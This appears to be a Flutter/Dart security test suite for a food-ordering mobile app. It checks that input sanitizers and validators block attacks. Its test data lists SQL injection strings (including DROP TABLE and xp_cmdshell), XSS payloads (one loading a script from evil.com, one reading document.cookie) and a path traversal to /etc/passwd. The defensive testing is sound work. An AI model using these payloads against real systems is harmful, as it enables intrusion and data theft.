import 'package:flutter_test/flutter_test.dart';
import 'package:chazin_food_mobile/core/utils/security_sanitizer.dart';
import 'package:chazin_food_mobile/core/utils/helpers.dart';

void main() {
  group('MSP & OWASP Mobile - Exploratory Security Test Suite', () {
    // ─── 1. SQL INJECTION (SQLi) ATTACK SIMULATION ───
    group('1. SQL Injection Prevention & Validation', () {
      final List<String> sqliPayloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "1; DROP TABLE users; --",
        "' UNION SELECT null, username, password FROM users --",
        "x' AND email IS NULL; --",
        "admin' /*",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 'a'='a",
      ];

      for (final payload in sqliPayloads) {
        test('Detects and blocks SQLi payload: "$payload"', () {
          final isInjection = SecuritySanitizer.hasSqlInjection(payload);
          expect(
            isInjection,
            isTrue,
            reason: 'SecuritySanitizer should flag: $payload',
          );

          final validationResult = SecurityValidators.validateNoInjection(
            payload,
            fieldName: 'Usuario',
          );
          expect(
            validationResult,
            isNotNull,
            reason: 'SecurityValidators must reject SQLi payload: $payload',
          );
        });
      }

      test('Allows clean legitimate strings with SQL-like words in natural language', () {
        const cleanProduct = 'Combo Especial Hamburguesa Clásica';
        const cleanDescription = 'Selección de carnes a la parrilla con queso';
        expect(SecuritySanitizer.hasSqlInjection(cleanProduct), isFalse);
        expect(SecuritySanitizer.hasSqlInjection(cleanDescription), isFalse);
        expect(SecurityValidators.validateNoInjection(cleanProduct), isNull);
        expect(SecurityValidators.validateNoInjection(cleanDescription), isNull);
      });
    });

    // ─── 2. CROSS-SITE SCRIPTING (XSS) & SCRIPT INJECTION ───
    group('2. XSS & Malicious Script Prevention', () {
      final List<String> xssPayloads = [
        "<script>alert('XSS')</script>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        "<img src=x onerror=alert(document.cookie)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<a href='javascript:void(0)' onclick='stealToken()'>Click me</a>",
        "<body onload=alert('Pwned')>",
      ];

      for (final payload in xssPayloads) {
        test('Detects and blocks XSS payload: "$payload"', () {
          final isXss = SecuritySanitizer.hasXss(payload);
          expect(isXss, isTrue, reason: 'SecuritySanitizer should flag XSS: $payload');

          final validationResult = SecurityValidators.validateNoInjection(
            payload,
            fieldName: 'Comentario',
          );
          expect(
            validationResult,
            isNotNull,
            reason: 'SecurityValidators must reject XSS: $payload',
          );
        });

        test('Sanitizes and neutralizes HTML tags in: "$payload"', () {
          final sanitized = SecuritySanitizer.stripXss(payload);
          expect(sanitized.contains('<script>'), isFalse);
          expect(sanitized.contains('<iframe'), isFalse);
          expect(sanitized.contains('onerror='), isFalse);
        });
      }

      test('Allows safe descriptions with accents, commas and numbers', () {
        const safeText = 'Hamburguesa con salsa tártara, papas y gaseosa de 400ml - \$15.000 COP';
        expect(SecuritySanitizer.hasXss(safeText), isFalse);
        expect(SecurityValidators.validateNoInjection(safeText), isNull);
      });
    });

    // ─── 3. CONTROL CHARACTERS, NULL BYTES & PATH TRAVERSAL ───
    group('3. Control Characters & Path Traversal Prevention', () {
      test('Detects and strips null bytes (\\x00)', () {
        const malicious = 'admin\x00.chazinfood.com';
        expect(SecuritySanitizer.hasControlChars(malicious), isTrue);

        final sanitized = SecuritySanitizer.stripControlCharacters(malicious);
        expect(sanitized, equals('admin.chazinfood.com'));
      });

      test('Neutralizes path traversal attempts (../)', () {
        const traversalPath = '../../../etc/passwd';
        final safePath = SecuritySanitizer.sanitizePath(traversalPath);
        expect(safePath.contains('..'), isFalse);
        expect(safePath, equals('etc/passwd'));
      });
    });

    // ─── 4. INPUT VALIDATORS (EMAIL, PASSWORD, NUMBERS) ───
    group('4. Application Validators Security & Boundary Tests', () {
      test('Validators.email rejects SQLi and XSS payloads', () {
        expect(Validators.email("' OR '1'='1"), isNotNull);
        expect(Validators.email("<script>alert(1)</script>@test.com"), isNotNull);
        expect(Validators.email(""), isNotNull);
        expect(Validators.email(null), isNotNull);
        expect(Validators.email("admin@chazinfood.com"), isNull);
      });

      test('Validators.password enforces minimum length and blocks control chars', () {
        expect(Validators.password("12345"), isNotNull); // Too short
        expect(Validators.password("admin\x00password"), isNotNull); // Null byte
        expect(Validators.password("pass123456"), isNull); // Valid safe password
      });

      test('Validators.price enforces non-negative numeric boundaries', () {
        expect(Validators.price(null), isNotNull);
        expect(Validators.price("-500"), isNotNull);
        expect(Validators.price("0"), isNotNull);
        expect(Validators.price("abc"), isNotNull);
        expect(Validators.price("15000"), isNull);
      });
    });

    // ─── 5. FULL SANITIZE & PARAMS INTEGRITY ───
    group('5. General Sanitization Integrity', () {
      test('SecuritySanitizer.sanitize cleans strings safely without breaking content', () {
        const input = "  <script>alert(1)</script>  Perro Caliente Especial \x00 ";
        final output = SecuritySanitizer.sanitize(input);
        expect(output.contains('<script>'), isFalse);
        expect(output.contains('\x00'), isFalse);
        expect(output, contains('Perro Caliente Especial'));
      });
    });
  });
}

